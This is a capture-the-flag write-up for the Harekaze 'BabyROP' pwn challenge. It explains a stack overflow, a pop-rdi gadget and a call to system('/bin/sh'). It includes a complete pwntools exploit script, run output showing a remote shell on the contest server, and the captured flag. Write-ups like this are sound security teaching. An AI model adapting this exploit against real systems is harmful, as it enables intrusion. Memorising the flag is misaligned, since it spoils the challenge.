## BabyROP
### Category : PWN

---

We are given a Binary File. As the name suggests, it's probably building a ROP (Return Oriented Programming) Chain. 

Using `checksec`

```
checksec babyrop                                             
[*] '/harekaze/Baby_ROP/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`NX Enabled`, so can't embed shell code. `Canary` no enabled, so can use Buffer Overflow.

Using ghidra, decompiled main.
```

undefined8 main(void)

{
  undefined local_18 [16];
  
  system("echo -n \"What\'s your name? \"");
  __isoc99_scanf(&DAT_004006c5,local_18);
  printf("Welcome to the Pwn World, %s!\n",local_18);
  return 0;
}

```

One distint is use of `system`, so we can definitely, create a ROP chain to call system. All we need is a string, something like, `/bin/bash` or `cat flag.txt` etc. 

Using ghidra, we observe the .data section and find a variable `binsh` at location `0x00601048` . We use gdb to confirm the string, and find `/bin/sh`. Booyah!, we can exploit this. 

---
### Creating the payload.
---

So, we need the offset of the buffer, a `pop rdi; ret;` gadget, location of `binsh`, and location of `system`

Using ROPGadget
```
0x0000000000400683 : pop rdi ; ret
```
Good enough!

exploit.py
```
from pwn import *

def get_offset(elf):
    io = process(elf.path)
    io.sendline(cyclic(2010))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("%#x stack", stack)
    pattern = core.read(stack, 4)
    info("%r pattern", pattern)
    offset = cyclic_find(pattern)
    info("OFFSET : %s",offset)
    return offset

elf = context.binary = ELF('babyrop')

offset = get_offset(elf)

shell = elf.symbols.binsh

system = elf.symbols.system

pop_gadget = 0x0000000000400683

info("SYSTEM : %#x" , system)
info ("SHELL : %#x", shell)
info("POP Gadget : %#x",pop_gadget)
shell = p64(shell)
system = p64(system)
pop_gadget = p64(pop_gadget)
info("SYSTEM : %s" , system)
info ("SHELL : %s", shell)
info("POP Gadget : %s",pop_gadget)

payload = 'A'*(offset)
payload += pop_gadget
payload += shell
payload += system

#io = process(elf.path)
io = remote('problem.harekaze.com',20001)
#payload = "A"*40 + gadget + print_flag + system
io.sendline(payload)
io.interactive()
```

Output
```
python2 exploit.py                                       2
[*] '/harekaze/Baby_ROP/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/harekaze/Baby_ROP/babyrop': pid 13709
[*] Process '/harekaze/Baby_ROP/babyrop' stopped with exit code -11 (SIGSEGV) (pid 13709)
[!] Found bad environment at 0x7ffdd0c8bfbb
[+] Parsing corefile...: Done
[*] '/harekaze/Baby_ROP/core.13709'
    Arch:      amd64-64-little
    RIP:       0x40061a
    RSP:       0x7ffdd0c8a4f8
    Exe:       '/harekaze/Baby_ROP/babyrop' (0x400000)
    Fault:     0x6161616861616167
[*] 0x7ffdd0c8a4f8 stack
[*] 'gaaa' pattern
[*] OFFSET : 24
[*] SYSTEM : 0x40048c
[*] SHELL : 0x601048
[*] POP Gadget : 0x400683
[*] SYSTEM : \x8c\x04@\x00\x00\x00\x00\x00
[*] SHELL : H\x10`\x00\x00\x00\x00\x00
[*] POP Gadget : \x83\x06@\x00\x00\x00\x00\x00
[+] Opening connection to problem.harekaze.com on port 20001: Done
[*] Switching to interactive mode
What's your name? $ whoami
babyrop
$ cd /home/babyrop
$ cat flag
HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}
$ exit
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to problem.harekaze.com port 20001
[*] Got EOF while sending in interactive
```

For More Explanation of ROP Chaining, check out my writeups of [ROP Emporium](../ROP_Emporium.md)